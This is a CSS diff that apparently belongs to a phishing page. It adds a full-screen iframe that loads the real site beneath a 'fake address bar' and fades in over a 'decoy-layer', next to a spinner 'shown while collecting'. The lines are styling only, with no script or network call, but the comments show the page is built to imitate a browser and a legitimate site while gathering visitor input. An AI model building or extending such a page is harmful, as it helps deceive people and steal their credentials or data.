@@ -164,6 +164,29 @@ html, body {
   padding: 20px 0;
 }
 
+/* ---- Real-site iframe overlay ---- */
+.real-site-frame {
+  position: fixed;
+  top: 40px;            /* below the fake address bar */
+  left: 0;
+  width: 100%;
+  height: calc(100vh - 40px);
+  border: none;
+  z-index: 500;
+  background: #fff;
+  opacity: 0;
+  transition: opacity .4s ease;
+}
+.real-site-frame.loaded {
+  opacity: 1;
+}
+
+/* Loading shimmer while iframe loads */
+.decoy-layer::after {
+  content: '';
+  display: none;  /* activated by JS if needed */
+}
+
 /* ---- Spinner overlay (shown while collecting) ---- */
 .spinner-overlay {
   position: fixed;
